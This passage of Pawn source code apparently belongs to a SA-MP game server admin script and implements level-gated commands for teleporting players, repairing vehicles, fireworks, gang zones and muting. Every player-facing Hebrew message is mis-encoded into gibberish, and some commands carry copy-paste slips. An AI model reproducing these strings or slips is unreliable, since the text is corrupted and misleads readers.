		format(string,sizeof(string)," .фрующя ∙щЁф р· фуюх· ∙ьъ ьуюх· юёЇ° %d",s);
		SendClientMessage(id,green,string);
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/getskin") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 6 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 5");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /getskin [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		format(string,sizeof(string)," .фхр %d %s юёЇ° фуюх· ∙ь",GetPlayerSkin(id),GetName(id));
		SendClientMessage(playerid,green,string);
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/setpos") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 6 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 6");
		new id, Float:p[3], string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /setpos [id/name] [x] [y] [z] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		for(new i=0;i<3;i++)
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsFloat(cmd)) return SendClientMessage(playerid,white," /setpos [id/name] [x] [y] [z] :Ўх°· ф∙щюх∙");
			p[i] = floatstr(cmd);
			if(p[i] < -20000.0 || p[i] > 20000.0) return SendClientMessage(playerid,red," .ющўхэ ∙тхщ");
		}
		format(string,sizeof(string)," .ь %.4f,%.4f,%.4f %s ∙щЁщ· р· фющўхэ ∙ь ",p[0],p[1],p[2],GetName(id));
		SendClientMessage(playerid,green,string);
		SendClientMessage(id,green," .фрующя ∙щЁф р· фющўхэ ∙ьъ");
		SetPlayerPos(id,p[0],p[1],p[2]);
		return 1;
	}
	if(equal(cmd,"/getpos") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 6 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 6");
		new id, Float:p[3], string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /getpos [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		GetPlayerPos(id,p[0],p[1],p[2]);
		format(string,sizeof(string)," %.4f,%.4f,%.4f :%s фющўхэ ∙ь",p[0],p[1],p[2],GetName(id));
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/pfix") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 6 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 6");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /pfix [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(!IsPlayerInAnyVehicle(id)) return SendClientMessage(playerid,red," .ю∙·ю∙ цф ьр с°ыс");
		new v = GetPlayerVehicleID(id);
		RepairVehicle(v);
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerInVehicle(i,v))
		{
			if(i != playerid) PlaySound(i,1133);
			SendClientMessage(i,green," .ф°ыс ∙ьъ ·хўя Єь щущ фрующя");
		}
		PlaySound(playerid,1133);
		format(string,sizeof(string)," .%s ·щўЁ· р· ф°ыс ∙ь",GetName(id));
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/fac") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 6 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 6");
		new invalids = 0, string[M_S];
		for(new v = 0; v < MAX_VEHICLES; v++) if(vehicleinfo[v][vvalid])
		{
			RepairVehicle(v);
			if(invalids > 0) invalids = 0;
		}
		else if(++invalids >= 50) break;
		PlaySound(playerid,1133);
		format(string,sizeof(string)," *** .%s ыь ф°ысщэ с∙°· ·хўЁх Єь щущ фрующя",GetName(playerid));
		SendClientMessageToAll(green,string);
		return 1;
	}
	if(equal(cmd,"/setposfindz") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 6 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 6");
		new id, Float:p[3], string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /setposfindz [id/name] [x] [y] [z] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		for(new i=0;i<3;i++)
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsFloat(cmd)) return SendClientMessage(playerid,white," /setposfindz [id/name] [x] [y] [z] :Ўх°· ф∙щюх∙");
			p[i] = floatstr(cmd);
			if(p[i] < -20000.0 || p[i] > 20000.0) return SendClientMessage(playerid,red," .ющўхэ ∙тхщ");
		}
		format(string,sizeof(string)," .ь %.4f,%.4f,%.4f %s ∙щЁщ· р· фющўхэ ∙ь ",p[0],p[1],p[2],GetName(id));
		SendClientMessage(playerid,green,string);
		SendClientMessage(id,green," .фрующя ∙щЁф р· фющўхэ ∙ьъ");
		SetPlayerPosFindZ(id,p[0],p[1],p[2]);
		return 1;
	}
	if((equal(cmd,"/mapt") || equal(cmd,"/mapteleport")) && IsPlayerMAdmin(playerid))
	{
		cmd = strtok(cmdtext,idx);
		if(playerinfo[playerid][admin] < 7 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 7");
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /mapteleport(mapt) [on/off] :Ўх°· ф∙щюх∙");
		if(equal(cmd,"on"))
		{
			playerinfo[playerid][mapt] = 1;
			SendClientMessage(playerid,green," .юЎс ∙щтх° у°ъ фюЇф фхЇЄь");
			PlaySound(playerid,1057);
		}
		else if(equal(cmd,"off"))
		{
			playerinfo[playerid][mapt] = 0;
			SendClientMessage(playerid,green," .юЎс ∙щтх° у°ъ фюЇф фхЇёў");
			PlaySound(playerid,1057);
		}
		else SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/smark") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 7 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 7");
		if(playerinfo[playerid][mark2][2]) return SendClientMessage(playerid,red," .ыс° щ∙ ьъ ющўхэ ∙юх°");
		new Float:p[3];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		for(new i=0;i<3;i++) playerinfo[playerid][mark][i] = p[i];
		playerinfo[playerid][mark2][0] = GetPlayerInterior(playerid);
		playerinfo[playerid][mark2][1] = GetPlayerVirtualWorld(playerid);
		playerinfo[playerid][mark2][2] = 1;
		SetPlayerMapIcon(playerid,icon_player,p[0],p[1],p[2],35,0);
		return 1;
	}
	if(equal(cmd,"/gmark") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 7 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 7");
		if(!playerinfo[playerid][mark2][2]) return SendClientMessage(playerid,red," .рщя ьъ ющўхэ ∙юх°");
		switch(GetPlayerState(playerid))
		{
			case PLAYER_STATE_ONFOOT, PLAYER_STATE_PASSENGER: SetPlayerPos(playerid,playerinfo[playerid][mark][0]+floatrand(-1.0,1.0),playerinfo[playerid][mark][1]+floatrand(-1.0,1.0),playerinfo[playerid][mark][2]);
			case PLAYER_STATE_DRIVER:
			{
				SetVehiclePos(GetPlayerVehicleID(playerid),playerinfo[playerid][mark][0]+floatrand(-3.0,3.0),playerinfo[playerid][mark][1]+floatrand(-3.0,3.0),playerinfo[playerid][mark][2],playerid);
				LinkVehicleToInterior(GetPlayerVehicleID(playerid),playerinfo[playerid][mark2][0]);
				SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),playerinfo[playerid][mark2][1]);
			}
		}
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,playerinfo[playerid][mark2][0]);
		SetPlayerVirtualWorld(playerid,playerinfo[playerid][mark2][1]);
		return 1;
	}
	if(equal(cmd,"/rmark") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 7 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 7");
		if(!playerinfo[playerid][mark2][2]) return SendClientMessage(playerid,red," .рщя ьъ ющўхэ ∙юх°");
		for(new i=0;i<3;i++) playerinfo[playerid][mark][i] = 0.0;
		playerinfo[playerid][mark2] = {0,world_normal,0};
		RemovePlayerMapIcon(playerid,icon_player);
		return 1;
	}
	if(equal(cmd,"/alist") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 7 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 7");
		new File:al, read[M_S];
		SendClientMessage(playerid,lightblue," ~~~ :°∙щю· фрующЁщэ ~~~");
		fileCheck(file_admins);
		al = fopen(file_admins,io_read);
		while(fread(al,read,sizeof(read),false))
		{
			if(read[0] == '#') continue;
			if(strfind(read,"=") != -1) read[strfind(read,"=")] = ' ';
			SendClientMessage(playerid,grey,read);
		}
		fclose(al);
		SendClientMessage(playerid,lightblue," ~~~~~~~~~~~~~~~~~~~~");
		return 1;
	}
	if(equal(cmd,"/fireworks") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 7 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 7");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /fireworks [1-6] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /fireworks 1 :ф∙юу· ыь фцщўхўщэ");
			SendClientMessage(playerid,white," /fireworks 2 :юш° цщўхўщэ");
			SendClientMessage(playerid,white," /fireworks 3 :фЇёў· юш° цщўхўщэ");
			SendClientMessage(playerid,white," /fireworks 4 :юЄть цщўхўщэ");
			SendClientMessage(playerid,white," /fireworks 5 :ыхыс цщўхўщэ");
			SendClientMessage(playerid,white," /fireworks 6 :цщўхўщэ с∙х°ф");
			return 1;
		}
		new Float:p[3];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		switch(strval(cmd))
		{
			case 1:
			{
				if(!fireworks) return SendClientMessage(playerid,red," .рщя цщўхўщэ");
				for(new i = 0; i < 100; i++) if(firework[i] != -1)
				{
					DestroyObject(firework[i]);
					firework[i] = -1;
				}
				fireworks = 0;
				SendClientMessage(playerid,green," .ыь фцщўхўщэ фх∙юух");
			}
			case 2:
			{
				if(!useFireworks) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЇЄщь цщўхў ы°тЄ");
				if(fireworks >= MAX_FIREWORKS-1) return SendClientMessage(playerid,red,"(" #MAX_FIREWORKS " ўщщющэ щх·° юущ цщўхўщэ, рЁр фю·я (ффтсьф: ");
				cmd = strtok(cmdtext,idx);
				if(!strlen(cmd)) return SendClientMessage(playerid,white," /fireworks 2 [count] :Ўх°· ф∙щюх∙");
				new count = strval(cmd);
				if(count < 1 || count > MAX_FIREWORKS-1) return SendClientMessage(playerid,red," .ыюх· ∙тхщф");
				GetXYInFrontOfPlayer(playerid,p[0],p[1],25.0);
				useFireworks = 0, fireworkLine = 0;
				SetTimerPck(fireworkTimer,"FireworksMatar",800,1,"fffi",p[0],p[1],p[2],count);
				SendClientMessage(playerid,green," .ЁхЎ° юш° цщўхўщэ");
			}
			case 3:
			{
				KillTimer(fireworkTimer);
				useFireworks = 1;
				SendClientMessage(playerid,green," .фхЇёў юш° фцщўхўщэ");
			}
			case 4:
			{
				if(!useFireworks) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЇЄщь цщўхў ы°тЄ");
				if(fireworks >= MAX_FIREWORKS-1) return SendClientMessage(playerid,red,"(" #MAX_FIREWORKS " ўщщющэ щх·° юущ цщўхўщэ, рЁр фю·я (ффтсьф: ");
				cmd = strtok(cmdtext,idx);
				if(!strlen(cmd)) return SendClientMessage(playerid,white," /fireworks 4 [model] :Ўх°· ф∙щюх∙");
				new model = strval(cmd) == 1 ? 354 : 3666, Float:fsize = floatrand(5.0,50.0);
				CreateFirework(model,p[0]+fsize,p[1],p[2],125.0,30.0);
				CreateFirework(model,p[0],p[1]+fsize,p[2],125.0,30.0);
				CreateFirework(model,p[0]+fsize,p[1]+fsize,p[2],125.0,30.0);
				CreateFirework(model,p[0]-fsize,p[1],p[2],125.0,30.0);
				CreateFirework(model,p[0],p[1]-fsize,p[2],125.0,30.0);
				CreateFirework(model,p[0]-fsize,p[1]-fsize,p[2],125.0,30.0);
				SendClientMessage(playerid,green," .ЁхЎ° юЄть цщўхўщэ");
			}
			case 5:
			{
				if(!useFireworks) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЇЄщь цщўхў ы°тЄ");
				if(fireworks >= MAX_FIREWORKS-1) return SendClientMessage(playerid,red,"(" #MAX_FIREWORKS " ўщщющэ щх·° юущ цщўхўщэ, рЁр фю·я (ффтсьф: ");
				cmd = strtok(cmdtext,idx);
				if(!strlen(cmd)) return SendClientMessage(playerid,white," /fireworks 5 [model] :Ўх°· ф∙щюх∙");
				new model = strval(cmd) == 1 ? 354 : 3666;
				GetXYInFrontOfPlayer(playerid,p[0],p[1],25.0);
				CreateFirework(model,p[0]+10.0,p[1],p[2],125.0,30.0);
				CreateFirework(model,p[0]+20.0,p[1],p[2],125.0,30.0);
				CreateFirework(model,p[0]-20.0,p[1],p[2],125.0,30.0);
				CreateFirework(model,p[0]-10.0,p[1],p[2],125.0,30.0);
				CreateFirework(model,p[0],p[1]+10.0,p[2],125.0,30.0);
				CreateFirework(model,p[0],p[1]+20.0,p[2],125.0,30.0);
				CreateFirework(model,p[0],p[1]-20.0,p[2],125.0,30.0);
				CreateFirework(model,p[0],p[1]-10.0,p[2],125.0,30.0);
				SendClientMessage(playerid,green," .ЁхЎ° ыхыс цщўхўщэ");
			}
			case 6:
			{
				if(!useFireworks) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЇЄщь цщўхў ы°тЄ");
				if(fireworks >= MAX_FIREWORKS-1) return SendClientMessage(playerid,red,"(" #MAX_FIREWORKS " ўщщющэ щх·° юущ цщўхўщэ, рЁр фю·я (ффтсьф: ");
				cmd = strtok(cmdtext,idx);
				if(!strlen(cmd)) return SendClientMessage(playerid,white," /fireworks 6 [count] :Ўх°· ф∙щюх∙");
				new count = strval(cmd);
				if(count < 1 || count > 100) return SendClientMessage(playerid,red," .ыюх· ∙тхщф");
				GetXYInFrontOfPlayer(playerid,p[0],p[1],10.0);
				useFireworks = 0, fireworkLine = 0;
				SetTimerPck(fireworkTimer,"FireworksLine",1000,1,"fffi",p[0],p[1],p[2],count);
				SendClientMessage(playerid,green," .ЁхЎ°ф ∙х°· цщўхўщэ");
			}
			default: return SendClientMessage(playerid,red," .рЇ∙°х· цщўхўщэ ∙тхщф");
		}
		return 1;
	}
	if(equal(cmd,"/gz") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 7 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 7");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /gz [action] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /gz square :щЎщ°· рцх° °щсхЄ");
			SendClientMessage(playerid,white," /gz setcolor :∙щЁхщ ЎсЄ фрцх°");
			SendClientMessage(playerid,white," /gz flash :фсфхс сЎсЄ юёхщщэ");
			SendClientMessage(playerid,white," /gz stopflash :фЇёў· фсфхс");
			SendClientMessage(playerid,white," /gz delete :ючщў· фрцх° ∙щЎ°·");
			return 1;
		}
		if(equal(cmd,"square"))
		{
			if(playerinfo[playerid][admingangzone] != INVALID_GANG_ZONE) return SendClientMessage(playerid,red," .ыс° щЎ°· рцх° рчу, ьр Ёщ·я ьщЎх° Єху");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /gz square [size] :Ўх°· ф∙щюх∙");
			new Float:size = floatstr(cmd), Float:p[3];
			if(size < 1.0 || size > 2000.0) return SendClientMessage(playerid,red," .тхуь фрцх° ∙тхщ");
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			playerinfo[playerid][admingangzone] = GangZoneCreate(p[0]-size,p[1]-size,p[0]+size,p[1]+size);
			GangZoneShowForAll(playerinfo[playerid][admingangzone],white);
			SendClientMessage(playerid,green," .щЎ°· рцх° чу∙ сЎх°· °щсхЄ");
		}
		else if(equal(cmd,"setcolor"))
		{
			if(playerinfo[playerid][admingangzone] == INVALID_GANG_ZONE) return SendClientMessage(playerid,red," .ьр щЎ°· рє рцх°");
			new r, g, b, inv, c = -1;
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd))
			{
				SendClientMessage(playerid,white," /gz setcolor [red 0-255] [green 0-255] [blue 0-255] [inv 0-255] :Ўх°· ф∙щюх∙");
				return SendClientMessage(playerid,white," /gz setcolor [color name] :Ўх°· ф∙щюх∙ #2");
			}
			if(IsNumeric(cmd))
			{
				r = strval(cmd),
				cmd = strtok(cmdtext,idx),
				g = !strlen(cmd) || !IsNumeric(cmd) ? r : strval(cmd),
				cmd = strtok(cmdtext,idx),
				b = !strlen(cmd) || !IsNumeric(cmd) ? g : strval(cmd),
				cmd = strtok(cmdtext,idx),
				inv = !strlen(cmd) || !IsNumeric(cmd) ? 255 : strval(cmd);
				if(r < 0 || r > 255 || g < 0 || g > 255 || b < 0 || b > 255 || inv < 0 || inv > 255) return SendClientMessage(playerid,red," .(RGBA) рчу юфЎсЄщэ ∙тхщ");
				c = rgba2hex(r,g,b,inv);
			}
			else for(new i = 0; i < sizeof(Colors)-1; i++) if(equal(cmd,Colors[i][colName])) c = Colors[i][colHex];
			if(c == -1) return SendClientMessage(playerid,red," .ЎсЄ ∙тхщ");
			GangZoneHideForAll(playerinfo[playerid][admingangzone]);
			GangZoneShowForAll(playerinfo[playerid][admingangzone],c);
			SendClientMessage(playerid,c," .∙щЁщ· р· ЎсЄ фрцх° ьЎсЄ ффхуЄф фцх");
		}
		else if(equal(cmd,"flash"))
		{
			if(playerinfo[playerid][admingangzone] == INVALID_GANG_ZONE) return SendClientMessage(playerid,red," .ьр щЎ°· рє рцх°");
			new r, g, b, inv, c = -1;
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd))
			{
				SendClientMessage(playerid,white," /gz flash [red 0-255] [green 0-255] [blue 0-255] [inv 0-255] :Ўх°· ф∙щюх∙");
				return SendClientMessage(playerid,white," /gz flash [color name] :Ўх°· ф∙щюх∙ #2");
			}
			if(IsNumeric(cmd))
			{
				r = strval(cmd),
				cmd = strtok(cmdtext,idx),
				g = !strlen(cmd) || !IsNumeric(cmd) ? r : strval(cmd),
				cmd = strtok(cmdtext,idx),
				b = !strlen(cmd) || !IsNumeric(cmd) ? g : strval(cmd),
				cmd = strtok(cmdtext,idx),
				inv = !strlen(cmd) || !IsNumeric(cmd) ? 255 : strval(cmd);
				if(r < 0 || r > 255 || g < 0 || g > 255 || b < 0 || b > 255 || inv < 0 || inv > 255) return SendClientMessage(playerid,red," .(RGBA) рчу юфЎсЄщэ ∙тхщ");
				c = rgba2hex(r,g,b,inv);
			}
			else for(new i = 0; i < sizeof(Colors)-1; i++) if(equal(cmd,Colors[i][colName])) c = Colors[i][colHex];
			if(c == -1) return SendClientMessage(playerid,red," .ЎсЄ ∙тхщ");
			GangZoneFlashForAll(playerinfo[playerid][admingangzone],c);
			SendClientMessage(playerid,c," .фЇы· р· фрцх° ьюфсфс сЎсЄ ффхуЄф фцх");
		}
		else if(equal(cmd,"stopflash"))
		{
			if(playerinfo[playerid][admingangzone] == INVALID_GANG_ZONE) return SendClientMessage(playerid,red," .ьр щЎ°· рє рцх°");
			GangZoneStopFlashForAll(playerinfo[playerid][admingangzone]);
			SendClientMessage(playerid,green," .ЄЎ°· р· ффсфхс ∙ь фрцх°");
		}
		else if(equal(cmd,"delete"))
		{
			if(playerinfo[playerid][admingangzone] == INVALID_GANG_ZONE) return SendClientMessage(playerid,red," .ьр щЎ°· рє рцх°");
			GangZoneHideForAll(playerinfo[playerid][admingangzone]);
			GangZoneDestroy(playerinfo[playerid][admingangzone]);
			playerinfo[playerid][admingangzone] = INVALID_GANG_ZONE;
			SendClientMessage(playerid,green," .ючў· р· фрцх° ∙щЎ°·");
		}
		else return SendClientMessage(playerid,red," .рЇ∙°х· трЁт цхя ∙тхщф");
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/avcmds") && IsPlayerMAdmin(playerid))
	{
		SendClientMessage(playerid,lightblue,"/placeincar, /palarm, /pengine, /ptires");
		return 1;
	}
	if(equal(cmd,"/placeincar") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 15 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 15");
		new cmd2[M_S], id, weaponid, ammo2;
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2)) return SendClientMessage(playerid,white," /placeincar [playerid] [Vehicle ID] [slot] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
  		weaponid = strval(cmd2);
		cmd = strtok(cmdtext,idx);
		ammo2 = !strlen(cmd) || !IsNumeric(cmd)? 0:strval(cmd);
		PutPlayerInVehicle(id, weaponid, ammo2);
		return 1;
	}
	if(equal(cmd,"/palarm") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 15 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 15");
		new cmd2[256], id;
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || IsNumeric(cmd2)) return SendClientMessage(playerid,white," /palarm [id/name] [off/on] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		new v = GetPlayerVehicleID(id), params[7];
		GetVehicleParamsEx(v,params[0],params[1],params[2],params[3],params[4],params[5],params[6]);
		if(equal(cmd2,"off")) SetVehicleParamsEx(v,params[0],params[1],VEHICLE_PARAMS_OFF,params[3],params[4],params[5],params[6]);
		else if(equal(cmd2,"on")) SetVehicleParamsEx(v,params[0],params[1],VEHICLE_PARAMS_ON,params[3],params[4],params[5],params[6]);
		else return SendClientMessage(playerid,red," .∙тщрф сЇ°юш° ф∙ьщ∙щ");
		return 1;
	}
	if(equal(cmd,"/ptires") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 15 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 15");
		new cmd2[M_S], id, amount;
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /ptires [id/name] [status] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		amount = strval(cmd2);
		if(amount < 0 || amount > 15) return SendClientMessage(playerid,red,".юЎс тьтьщэ ьр ·ўщя");
		new panels, doors, lights, tires;
		new v = GetPlayerVehicleID(id);
		GetVehicleDamageStatus(v, panels, doors, lights, tires);
		UpdateVehicleDamageStatus(v, panels, doors, lights, amount);
		return 1;
	}
	if(equal(cmd,"/pengine") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 15 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 15");
		new cmd2[256], id;
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || IsNumeric(cmd2)) return SendClientMessage(playerid,white," /pengine [id/name] [off/on] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		new v = GetPlayerVehicleID(id), params[7];
		GetVehicleParamsEx(v,params[0],params[1],params[2],params[3],params[4],params[5],params[6]);
		if(equal(cmd2,"off")) SetVehicleParamsEx(v,0,params[1],params[2],params[3],params[4],params[5],params[6]);
		else if(equal(cmd2,"on")) SetVehicleParamsEx(v,1,params[1],params[2],params[3],params[4],params[5],params[6]);
		else return SendClientMessage(playerid,red," .∙тщрф сЇ°юш° ф∙ьщ∙щ");
		return 1;
	}
	if(equal(cmd,"/nocmd") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 8 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 8");
		new cmd2[256], id, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || IsNumeric(cmd2)) return SendClientMessage(playerid,white," /nocmd [id/name] [off/on] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(equal(cmd2,"off")) playerinfo[id][nocmd] = 0;
		else if(equal(cmd2,"on")) playerinfo[id][nocmd] = 1;
		else return SendClientMessage(playerid,red," .∙тщрф сЇ°юш° ф∙ьщ∙щ");
		format(string,sizeof(string),playerinfo[id][nocmd] ? (" .тщ∙ф ьы·хс Їўхух· %s фх°у· ь") : (" .тщ∙ф ьы·хс Їўхух· %s Ё·· ь"),GetName(id));
		SendClientMessage(playerid,green,string);
		SendClientMessage(id,green,playerinfo[id][nocmd] ? (" .фрующя фх°щу ьъ р· фтщ∙ф ьы·хс Їўхух·") : (" .фрующя Ё·я ьъ тщ∙ф ьы·хс Їўхух·"));
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/nopm") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 8 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 8");
		new cmd2[256], id, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || IsNumeric(cmd2)) return SendClientMessage(playerid,white," /nocmd [id/name] [off/on] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(equal(cmd2,"off")) playerinfo[id][nopm] = 0;
		else if(equal(cmd2,"on")) playerinfo[id][nopm] = 1;
		else return SendClientMessage(playerid,red," .∙тщрф сЇ°юш° ф∙ьщ∙щ");
		format(string,sizeof(string),playerinfo[id][nopm] ? (" .тщ∙ф ьы·хс фхуЄх· Ї°шщх· %s фх°у· ь") : (" .тщ∙ф ьы·хс фхуЄх· Ї°шщх· %s Ё·· ь"),GetName(id));
		SendClientMessage(playerid,green,string);
